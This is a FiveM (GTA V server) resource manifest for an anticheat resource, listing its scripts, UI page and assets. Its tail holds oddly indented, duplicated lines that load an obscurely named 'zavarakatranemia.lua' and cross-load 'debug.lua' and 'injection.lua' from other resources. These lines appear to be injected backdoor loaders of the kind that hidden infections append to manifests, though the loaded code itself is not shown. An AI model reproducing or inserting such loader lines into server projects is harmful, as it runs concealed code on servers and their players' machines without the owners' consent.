resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Ligma Anticheat'

version '4.1'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'sv_config.lua',
	'server/*.lua',
}


client_scripts {
	"client/*.lua"
}

server_exports {
	'getPlayedTime'
}

ui_page 'index.html'

files {
	'client/inject.lua',
	'index.html',
	'assets/js/jquery.min.js',
	'assets/js/main.js',
	'assets/css/styles.css',
	'assets/bootstrap/js/bootstrap.min.js',
	'assets/bootstrap/css/bootstrap.min.css',
}


client_script '@esx_ligmanticheat/client/inject.lua'


files {
				'zavarakatranemia.lua',
			}
			

client_script '@esx_libraries/client/debug.lua'

client_script '@esx_ligmanticheat/client/inject.lua'

client_script 'zavarakatranemia.lua'
server_script "@Protector/Server/injection.lua"